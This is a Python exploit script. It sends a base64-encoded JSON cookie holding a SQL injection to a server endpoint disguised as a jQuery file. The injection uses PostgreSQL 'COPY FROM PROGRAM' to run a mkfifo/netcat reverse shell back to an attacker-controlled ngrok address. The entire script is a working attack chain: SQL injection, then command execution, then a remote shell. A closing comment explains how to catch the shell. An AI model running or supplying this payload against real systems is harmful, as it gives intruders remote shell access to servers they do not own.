#!/usr/bin/python3
import sys
import requests
import urllib
import base64
import json
import random

url = f'http://{sys.argv[1]}'
url_rshell = sys.argv[2] #ngrok tcp

#only User-Agent seems important
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
}

ses = requests.Session()

cflb = '49f062b5-8b94-4fff-bb41-d504b148aa1b3'

#res = ses.get(f'{url}/assets/jquery-3.6.0.slim.min.js', headers = headers, 
#        cookies = {'__cflb': cflb})
#print(res.text[-100:])

task_id = random.randint(1, 10000)

kek = url_rshell.split(':')
cmd = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {kek[0]} {kek[1]} >/tmp/f'
sql_cmd = ("DROP TABLE IF EXISTS cmd_exec; "
"CREATE TABLE cmd_exec(cmd_output text); "
f"COPY cmd_exec FROM PROGRAM '{cmd}'")

cfuid_json = {
    'id': f'{task_id}); {sql_cmd}--',
    'output': f"kek"
}
cfuid = urllib.parse.quote_plus(base64.b64encode(json.dumps(cfuid_json).encode('utf-8')).decode('utf-8'))

res = ses.post(f'{url}/assets/jquery-3.6.0.slim.min.js', headers = headers,
    cookies = {
        '__cflb':  cflb,
        '__cfuid': cfuid
    })
print(res.text)

#get rshell with nc connected to ngrok port
